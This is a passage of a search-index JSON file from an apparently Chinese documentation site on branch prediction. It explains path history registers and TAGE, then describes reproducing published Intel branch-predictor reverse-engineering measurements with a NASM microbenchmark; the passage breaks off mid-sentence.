History","text":"<p>\u200b\u9664\u4e86\u200b\u8bb0\u5f55\u200b\u6240\u6709\u200b\u5206\u652f\u200b\u7684\u200b Taken/Not Taken \u200b\u5386\u53f2\u200b\u5230\u200b GHR \u200b\u91cc\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u8bb0\u5f55\u200b Taken \u200b\u5206\u652f\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4ee5\u53ca\u200b\u5206\u652f\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5230\u200b Path History Register \u200b\u91cc\u200b\uff0c\u200b\u4ee3\u66ff\u200b GHR \u200b\u7684\u200b\u4f5c\u7528\u200b\u3002Intel \u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u8fd9\u4e2a\u200b\u65b9\u6848\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Taken \u200b\u5206\u652f\u200b\u751f\u6210\u200b\u82e5\u5e72\u4f4d\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u5f02\u6216\u200b\u5230\u200b PHR \u200b\u5de6\u79fb\u200b\u82e5\u5e72\u4f4d\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b PHR\uff0c\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b Intel \u200b\u5904\u7406\u5668\u200b\u7684\u200b PHR \u200b\u53ef\u4ee5\u200b\u6700\u200b\u591a\u200b\u8bb0\u5f55\u200b 194 \u200b\u4e2a\u200b Taken \u200b\u5206\u652f\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#tage","title":"TAGE","text":"<p>TAGE \u200b\u662f\u200b\u6d41\u884c\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u7531\u200b\u4e00\u4e2a\u200b base predictor \u200b\u4ee5\u53ca\u200b\u82e5\u5e72\u4e2a\u200b PHT \u200b\u7ec4\u6210\u200b\u3002\u200b\u4e0d\u540c\u200b\u7684\u200b PHT \u200b\u91c7\u7528\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b GHR/PHR \u200b\u4f4d\u6570\u200b\uff0c\u200b\u4f4d\u6570\u200b\u5448\u200b\u51e0\u4f55\u7ea7\u6570\u200b\u3002\u200b\u9884\u6d4b\u200b\u65f6\u200b\uff0cbase predictor \u200b\u548c\u200b\u6240\u6709\u200b PHT \u200b\u540c\u65f6\u200b\u9884\u6d4b\u200b\uff0c\u200b\u6700\u540e\u200b\u91c7\u7528\u200b\u7ed9\u51fa\u200b\u9884\u6d4b\u200b\u91cc\u200b\u91c7\u7528\u200b\u7684\u200b\u5386\u53f2\u200b\u4f4d\u200b\u6570\u6700\u591a\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u3002</p> <p>PHT \u200b\u7684\u200b\u6bcf\u4e2a\u200b\u9879\u200b\u8bb0\u5f55\u200b\u4e86\u200b\uff1a</p> <ol> <li>prediction saturating counter\uff1a\u200b\u7528\u6765\u200b\u9884\u6d4b\u200b taken/not taken</li> <li>useful saturating counter\uff1a\u200b\u8868\u793a\u200b\u8be5\u200b\u8868\u9879\u200b\u7684\u200b\u91cd\u8981\u6027\u200b</li> <li>tag\uff1a\u200b\u51fa\u73b0\u200b index \u200b\u51b2\u7a81\u200b\u65f6\u200b\u5224\u65ad\u200b\u9884\u6d4b\u200b\u7684\u200b\u662f\u5426\u662f\u200b\u6b63\u786e\u200b\u7684\u200b\u5206\u652f\u200b</li> </ol> <p>useful \u200b\u7684\u200b\u7ef4\u62a4\u200b\u65b9\u6cd5\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b\u7528\u8be5\u200b\u8868\u9879\u200b\u9884\u6d4b\u200b\u7684\u200b\u6b63\u786e\u200b\uff0c\u200b\u800c\u7528\u200b\u66f4\u200b\u77ed\u200b\u5386\u53f2\u200b\u7684\u200b table \u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8be5\u200b\u8868\u9879\u200b\u5f88\u200b\u6709\u7528\u200b\uff0cuseful \u200b\u589e\u52a0\u200b</li> <li>\u200b\u53cd\u4e4b\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u8be5\u200b\u8868\u9879\u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u800c\u7528\u200b\u66f4\u200b\u77ed\u200b\u5386\u53f2\u200b\u7684\u200b table \u200b\u9884\u6d4b\u200b\u7684\u200b\u6b63\u786e\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8be5\u200b\u8868\u9879\u200b\u6548\u679c\u200b\u4e0d\u597d\u200b\uff0cuseful \u200b\u51cf\u5c11\u200b</li> </ol> <p>\u200b\u51fa\u73b0\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u65f6\u200b\uff0c\u200b\u8ba4\u4e3a\u200b\u5f53\u524d\u200b\u6240\u7528\u200b\u7684\u200b PHT \u200b\u7684\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u592a\u6bb5\u200b\uff0c\u200b\u4e0d\u591f\u200b\u9884\u6d4b\u200b\u5f53\u524d\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u5177\u6709\u200b\u66f4\u957f\u200b\u7684\u200b\u5386\u53f2\u200b\u7684\u200b PHT \u200b\u91cc\u200b\u5206\u914d\u200b\u4e00\u6761\u200b\u7ed9\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u627e\u200b\u4e00\u4e2a\u200b useful \u200b\u7b49\u4e8e\u200b 0 \u200b\u7684\u200b\u9879\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u4e00\u4e9b\u200b\u8868\u9879\u200b\u5f88\u200b\u957f\u65f6\u95f4\u200b\u90fd\u200b\u6ca1\u6709\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b useful \u200b\u6bd4\u8f83\u200b\u5927\u800c\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u66ff\u6362\u200b\uff0c\u200b\u5360\u7528\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u9700\u8981\u200b\u5b9a\u65f6\u200b\u51cf\u5c11\u200b PHT \u200b\u91cc\u200b\u6240\u6709\u200b\u8868\u9879\u200b\u7684\u200b useful \u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b useful \u200b\u8ba1\u6570\u5668\u200b\u4e5f\u200b\u6709\u200b\u8ba1\u65f6\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u592a\u4e45\u200b\u6ca1\u7528\u200b\u7684\u200b\u8868\u9879\u200b\u4f1a\u200b\u88ab\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u5728\u200b\u51fa\u73b0\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\uff0c\u200b\u521b\u5efa\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u8868\u9879\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u65b0\u200b\u8868\u9879\u200b\u8bb0\u5f55\u200b\u7684\u200b\u5386\u53f2\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e0d\u591f\u200b\u51c6\u786e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4e34\u65f6\u200b\u7528\u200b\u7b2c\u4e8c\u200b\u957f\u200b\u7684\u200b\u5339\u914d\u200b\u7684\u200b PHT \u200b\u91cc\u200b\u7684\u200b\u8868\u9879\u200b\u505a\u200b\u9884\u6d4b\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html","title":"CPU \u200b\u5fae\u200b\u67b6\u6784\u200b\u5206\u6790","text":""},{"location":"hardware/cpu_microarchitecture.html#intel","title":"\u590d\u73b0\u200b Intel \u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9006\u5411\u200b\u8bba\u6587","text":""},{"location":"hardware/cpu_microarchitecture.html#_1","title":"\u80cc\u666f","text":"<p>\u200b\u6700\u8fd1\u200b\u770b\u5230\u200b\u4e00\u7cfb\u5217\u200b\u5bf9\u200b Intel \u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u9006\u5411\u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b\u653b\u9632\u200b\u7684\u200b\u8bba\u6587\u200b\uff1a</p> <ul> <li>Half&amp;Half: Demystifying Intel's Directional Branch Predictors for Fast, Secure Partitioned Execution</li> <li>Pathfinder: High-Resolution Control-Flow Attacks Exploiting the Conditional Branch Predictor </li> <li>Indirector: High-Precision Branch Target Injection Attacks Exploiting the Indirect Branch Predictor</li> </ul> <p>\u200b\u56e0\u200b\u5176\u200b\u9006\u5411\u200b\u7684\u200b\u7cbe\u7ec6\u200b\u7a0b\u5ea6\u200b\u800c\u200b\u611f\u5230\u200b\u597d\u5947\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c1d\u8bd5\u200b\u8fdb\u884c\u200b\u590d\u73b0\u200b\uff0c\u200b\u4e3b\u8981\u200b\u662f\u200b\u9488\u5bf9\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u3002\u200b\u590d\u73b0\u200b\u5e73\u53f0\u200b\u4e3a\u200b Alder Lake \u200b\u67b6\u6784\u200b\u7684\u200b i9-12900KS \u200b\u548c\u200b Skylake \u200b\u67b6\u6784\u200b\u7684\u200b Xeon D-2146NT\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_2","title":"\u590d\u73b0","text":"<p>\u200b\u7531\u4e8e\u200b Pathfinder \u200b\u548c\u200b Indirector \u200b\u8bba\u6587\u200b\u90fd\u200b\u5728\u200b\u7f51\u4e0a\u200b\u516c\u5f00\u200b\u4e86\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5b83\u4eec\u200b\u90fd\u200b\u662f\u200b\u57fa\u4e8e\u200b agner \u200b\u7684\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u6846\u67b6\u200b \u200b\u4fee\u6539\u200b\u800c\u200b\u6765\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6211\u200b\u4e5f\u200b\u662f\u200b\u5728\u200b agner \u200b\u7684\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u6846\u67b6\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u505a\u200b\u7684\u200b\u590d\u73b0\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr","title":"PHR \u200b\u8bb0\u5f55\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570","text":"<p>\u200b\u73b0\u4ee3\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u4f1a\u200b\u8bb0\u5f55\u200b\u5168\u5c40\u200b\u7684\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u4fe1\u606f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bba\u6587\u200b\u91cc\u200b\u7b2c\u4e00\u6b65\u200b\u662f\u200b\u6d4b\u8bd5\u200b\u80fd\u591f\u200b\u8bb0\u5f55\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u5386\u53f2\u200b\u4fe1\u606f\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u6d4b\u8bd5\u200b\u601d\u8def\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <ol> <li>\u200b\u6839\u636e\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u4ee5\u200b 50% \u200b\u7684\u200b\u6982\u7387\u200b\u8ba9\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u8df3\u8f6c\u200b\u6216\u200b\u4e0d\u200b\u8df3\u8f6c\u200b</li> <li>\u200b\u63d2\u5165\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u603b\u662f\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\uff08\u200b\u4e0b\u79f0\u200b dummy branch\uff09</li> <li>\u200b\u6839\u636e\u200b\u7b2c\u4e00\u6b65\u200b\u7684\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u8ba9\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u548c\u200b\u7b2c\u4e00\u4e2a\u200b\u5206\u652f\u200b\u4ee5\u200b\u76f8\u540c\u200b\u65b9\u5411\u200b\u8df3\u8f6c\u200b\u6216\u200b\u4e0d\u200b\u8df3\u8f6c\u200b</li> </ol> <p>\u200b\u5982\u679c\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u8db3\u591f\u200b\u8bb0\u5f55\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u7684\u200b\u6240\u6709\u200b\u5206\u652f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u51c6\u786e\u200b\u5730\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u8df3\u8f6c\u200b\u65b9\u5411\u200b\u548c\u200b\u7b2c\u4e00\u6b65\u200b\u76f8\u540c\u200b\uff1b\u200b\u5982\u679c\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u4e0d\u591f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u65f6\u200b\uff0c\u200b\u5386\u53f2\u200b\u91cc\u200b\u6ca1\u6709\u200b\u7b2c\u4e00\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u51c6\u786e\u7387\u200b\u53ea\u4f1a\u200b\u6709\u200b 50%\u3002\u200b\u901a\u8fc7\u200b\u8fd9\u4e2a\u200b\u5dee\u522b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6d4b\u8bd5\u200b\u51fa\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u6709\u200b\u591a\u5c11\u200b\u3002\u200b\u7528\u200b NASM \u200b\u7f16\u5199\u200b\u8fd9\u4e2a\u200b\u6d4b\u8bd5\u200b\uff1a</p> <pre><code>; number of dummy branches\n%ifndef dummybranches\n    %define dummybranches 200\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n    ; read performance counters before loops\n    READ_PMC_START\n\nloop_begin:\n\n    ; train branch\n    rdrand eax\n    and eax, 1\n    jnz first_target\nfirst_target:\n\n    ; dummy branches\n    %assign i 0\n    %rep dummybranches\n    jmp dummy_branch_%+ i\ndummy_branch_%+ i:\n    %assign i i+1\n    %endrep\n\n    ; test branch\n    test eax, eax\n    jnz second_target\nsecond_target:\n\n    dec rdi\n    jnz loop_begin\n\n    ; read performance counters after loops\n    READ_PMC_END\n%endmacro\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b dummy branch \u200b\u6570\u91cf\u200b\u5728\u200b 193 \u200b\u53ca\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u63a5\u8fd1\u200b 0%\uff0c\u200b\u800c\u200b\u7b2c\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u5927\u7ea6\u200b 50%\uff0c\u200b\u5e73\u5747\u200b\u4e0b\u6765\u200b\u662f\u200b 25%\uff1b\u200b\u800c\u200b dummy branch \u200b\u6570\u91cf\u200b\u5728\u200b 194 \u200b\u53ca\u200b\u4ee5\u4e0a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u5927\u7ea6\u200b 50%\uff0c\u200b\u548c\u200b\u7b2c\u4e00\u4e2a\u200b\u5206\u652f\u200b\u5e73\u5747\u200b\u4e0b\u6765\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u662f\u200b 25%\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b Intel Alder Lake \u200b\u67b6\u6784\u200b\u4e0b\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u5386\u53f2\u200b\u53ea\u80fd\u200b\u8bb0\u5f55\u200b\u6700\u200b\u591a\u200b 194 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002\u200b\u628a\u200b\u4e2d\u95f4\u200b\u7684\u200b dummy branch \u200b\u7684\u200b\u603b\u662f\u200b\u8df3\u8f6c\u200b\u6539\u6210\u200b\u603b\u662f\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u53d1\u73b0\u200b\u603b\u200b\u7684\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u4e00\u76f4\u200b\u662f\u200b 25%\uff0c\u200b\u8bf4\u660e\u200b Intel Alder Lake \u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u5386\u53f2\u200b\u4e0d\u200b\u8bb0\u5f55\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u3002\u200b\u800c\u200b Path History Register(PHR) \u200b\u662f\u200b\u7b26\u5408\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\u7684\u200b\u4e00\u79cd\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u731c\u6d4b\u200b Intel \u200b\u91c7\u7528\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u65b9\u6848\u200b\u3002</p> <p>\u200b\u5728\u200b Skylake \u200b\u4e0b\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u5f97\u51fa\u200b Skylake \u200b\u67b6\u6784\u200b\u4e0b\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u5386\u53f2\u200b\u53ea\u80fd\u200b\u8bb0\u5f55\u200b\u6700\u8fd1\u200b 93 \u200b\u4e2a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr_1","title":"PHR \u200b\u91c7\u7528\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4f4d\u6570","text":"<p>PHR \u200b\u5728\u200b\u8bb0\u5f55\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8bb0\u5f55\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u81ea\u8eab\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5206\u652f\u200b\u8df3\u8f6c\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5f88\u200b\u597d\u200b\u7406\u89e3\u200b\uff0c\u200b\u4f46\u662f\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u81ea\u8eab\u200b\u7684\u200b\u5730\u5740\u200b\u5374\u200b\u4e0d\u597d\u200b\u8bf4\u200b\u662f\u200b\u54ea\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>0x10000 75 00  jnz target\n</code></pre> <p>\u200b\u8fd9\u200b\u6761\u200b jnz \u200b\u6307\u4ee4\u200b\u4ece\u200b 0x10000 \u200b\u5f00\u59cb\u200b\u5360\u7528\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u90a3\u4e48\u200b PHR \u200b\u5728\u200b\u8bb0\u5f55\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u54ea\u4e2a\u200b\u5462\u200b\uff1f\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u731c\u60f3\u200b\uff1a</p> <ol> <li>\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff080x10000\uff09</li> <li>\u200b\u4e0b\u200b\u4e00\u200b\u8df3\u200b\u6307\u4ee4\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff080x10002\uff09</li> </ol> <p>\u200b\u9605\u8bfb\u200b Pathfinder \u200b\u548c\u200b Indirector \u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u548c\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u901a\u8fc7\u200b\u90ae\u4ef6\u200b\u6c9f\u901a\u200b\u540e\u200b\uff08\u200b\u611f\u8c22\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u7684\u200b\u8be6\u7ec6\u200b\u6307\u5bfc\u200b\uff01\uff09\uff0c\u200b\u53d1\u73b0\u200b\u4ee5\u4e0a\u200b\u4e24\u4e2a\u200b\u731c\u60f3\u200b\u90fd\u200b\u4e0d\u200b\u5bf9\u200b\uff1a\u200b\u5b9e\u9645\u4e0a\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\uff080x10001\uff09\u3002\u200b\u8003\u8651\u200b\u5230\u200b x86 \u200b\u662f\u200b\u53d8\u957f\u200b\u6307\u4ee4\u96c6\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5408\u7406\u200b\uff1a\u200b\u901a\u8fc7\u200b\u8bb0\u5f55\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u200b\u4e86\u200b\u5904\u7406\u200b\u4e0d\u540c\u200b\u957f\u5ea6\u200b\u7684\u200b jnz \u200b\u6307\u4ee4\u200b\u7684\u200b\u60c5\u51b5\u200b\uff08\u200b\u4f8b\u5982\u200b jnz \u200b\u6709\u200b\u643a\u5e26\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b\u7acb\u5373\u200b\u6570\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u6b64\u65f6\u200b jnz + \u200b\u7acb\u5373\u200b\u6570\u200b\u4e00\u5171\u200b\u662f\u200b 6 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u662f\u200b\u7528\u200b\u7684\u200b 6 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u91cc\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5730\u5740\u200b\uff09\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6d4b\u8bd5\u200b PHR \u200b\u91c7\u7528\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u5730\u5740\u200b\u4f4d\u6570\u200b\uff0c\u200b\u529e\u6cd5\u200b\u662f\u200b\uff1a\u200b\u628a\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4f4d\u8bbe\u200b\u6210\u200b 0\uff0c\u200b\u6784\u9020\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff0c\u200b\u770b\u770b\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b\u51c6\u786e\u7387\u200b\u5982\u4f55\u200b\uff1a</p> <ol> <li>\u200b\u5faa\u73af\u200b\u82e5\u5e72\u6b21\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e9b\u200b\u6b21\u200b\u5faa\u73af\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u4f4d\u200b\u90fd\u200b\u662f\u200b 0\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u628a\u200b PHR \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u5168\u200b 0</li> <li>\u200b\u628a\u200b\u4e00\u4e2a\u200b\u4f9d\u8d56\u200b\u968f\u673a\u6570\u200b\u7684\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u653e\u7f6e\u200b\u5230\u200b\u7279\u5b9a\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4f4d\u8bbe\u200b\u6210\u200b 0\uff0c\u200b\u4e00\u4e9b\u200b\u4f4d\u8bbe\u200b\u6210\u200b 1</li> <li>\u200b\u518d\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e5f\u200b\u4f9d\u8d56\u200b\u7b2c\u4e8c\u6b65\u200b\u7684\u200b\u968f\u673a\u6570\u200b\u9009\u62e9\u200b\u8df3\u8f6c\u200b\u6216\u200b\u4e0d\u200b\u8df3\u8f6c\u200b</li> </ol> <p>\u200b\u8fd9\u4e48\u200b\u505a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u5148\u200b\u8ba9\u200b PHR \u200b\u6e05\u96f6\u200b\uff0c\u200b\u518d\u200b\u6267\u884c\u200b\u4e00\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u8df3\u8f6c\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b PHR \u200b\u5c06\u4f1a\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u8ba1\u7b97\u200b\u51fa\u65b0\u200b\u7684\u200b\u503c\u200b\uff1b\u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u6ca1\u6709\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u7531\u4e8e\u200b PHR \u200b\u53ea\u200b\u8bb0\u5f55\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u90a3\u4e48\u200b PHR \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u4f9d\u7136\u200b\u662f\u200b\u96f6\u200b\u3002\u200b\u5728\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPHR \u200b\u7684\u200b\u53d6\u503c\u200b\u5c31\u200b\u5f88\u200b\u91cd\u8981\u200b\u4e86\u200b\uff1a</p> <ol> <li>\u200b\u5047\u5982\u200b\u7b2c\u4e8c\u6b65\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e86\u200b\u975e\u200b\u96f6\u200b\u7684\u200b PHR\uff0c\u200b\u90a3\u4e48\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b PHR 